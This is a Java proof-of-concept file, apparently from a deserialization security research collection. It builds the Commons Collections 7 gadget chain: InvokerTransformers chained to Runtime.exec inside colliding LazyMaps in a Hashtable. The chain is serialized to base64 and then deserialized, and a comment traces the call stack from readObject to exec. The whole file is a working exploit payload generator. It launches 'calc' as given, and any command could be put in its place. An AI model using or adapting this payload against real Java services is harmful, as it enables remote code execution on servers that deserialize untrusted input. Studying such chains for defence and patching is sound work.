package com.javasec.pocs.cc;
import com.javasec.utils.SerializeUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.AbstractMap;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * exec:347, Runtime (java.lang)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * transform:126, InvokerTransformer (org.apache.commons.collections.functors)
 * transform:123, ChainedTransformer (org.apache.commons.collections.functors)
 * get:158, LazyMap (org.apache.commons.collections.map)
 * equals:472, AbstractMap (java.util)
 * equals:130, AbstractMapDecorator (org.apache.commons.collections.map)
 * reconstitutionPut:1221, Hashtable (java.util)
 * readObject:1195, Hashtable (java.util)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * base64deserial:59, SerializeUtils (com.javasec.utils)
 * main:45, CommonsCollections7 (com.javasec.pocs.cc)
 */
public class CommonsCollections7 {
    public static void main(String[] args) throws Exception {
        final String[] execArgs = new String[]{"calc"};
        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        execArgs),
                new ConstantTransformer(1)};
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(transformerChain,transformers);
        lazyMap2.remove("yy");
        String POC = SerializeUtils.base64serial(hashtable);
        SerializeUtils.base64deserial(POC);
    }
}
